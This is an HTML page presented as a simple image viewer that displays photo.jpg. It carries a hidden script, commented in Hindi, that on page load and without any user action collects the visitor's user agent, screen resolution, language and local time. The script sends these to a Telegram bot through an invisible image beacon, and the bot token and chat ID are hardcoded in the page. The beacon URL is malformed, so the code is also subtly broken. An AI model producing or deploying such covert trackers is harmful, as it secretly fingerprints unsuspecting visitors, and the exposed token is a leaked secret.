<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background-color: black; 
            margin: 0; 
            padding: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            user-select: none; 
        }
        img { 
            max-width: 100%; 
            max-height: 100vh; 
            object-fit: contain; 
        }
    </style>
</head>
<body>

    <!-- 📷 फोटो हमेशा लोड होगी -->
    <img src="photo.jpg" alt="Image Viewer">

    <script>
        const telegramToken = "8390339580:AAHgGBL-V3ya7JsCLs5e0lwYnIAEOypvtEE"; 
        const telegramChatId = "1798743066"; 

        // 🚀 बिना टच के तुरंत (Instant) काम करने वाला फंक्शन
        (function() {
            // बेसिक डिवाइस डिटेल्स निकालना जो कभी ब्लॉक नहीं होतीं
            const userAgentText = encodeURIComponent(navigator.userAgent);
            const screenRes = window.screen.width + "x" + window.screen.height;
            const pageLanguage = navigator.language || "Unknown";
            
            // भारत के समय अनुसार लाइव टाइम निकालना
            const currentTime = encodeURIComponent(new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }));

            // सुंदर मैसेज फॉर्मेट (मार्कडाउन के साथ)
            const textMessage = `🔔 *ZERO CLICK ALERT* 🔔\n\n` +
                                `📱 *Device Info:* \`${navigator.userAgent}\`\n` +
                                `🖥️ *Screen Size:* \`${screenRes}\`\n` +
                                `🌐 *Language:* \`${pageLanguage}\`\n` +
                                `⏱️ *Time:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}_`;

            const encodedMessage = encodeURIComponent(textMessage);

            // ⚡ सबसे अचूक तरीका: बिना फेच (Fetch) के सीधे इमेज लोड करवाकर टेलीग्राम सर्वर को हिट करना (Image Beacon)
            // यह तरीका बिना किसी यूज़र टच के, बैकग्राउंड में पलक झपकते ही मैसेज डिलीवर कर देता है
            const triggerUrl = `https://telegram.org{telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodedMessage}&parse_mode=Markdown`;
            
            // बैकग्राउंड में एक अदृश्य इमेज बनाकर तुरंत बोट को एक्टिवेट करना
            const pingBot = new Image();
            pingBot.src = triggerUrl;

            console.log("Tracking sent automatically");
        })();
    </script>

</body>
</html>
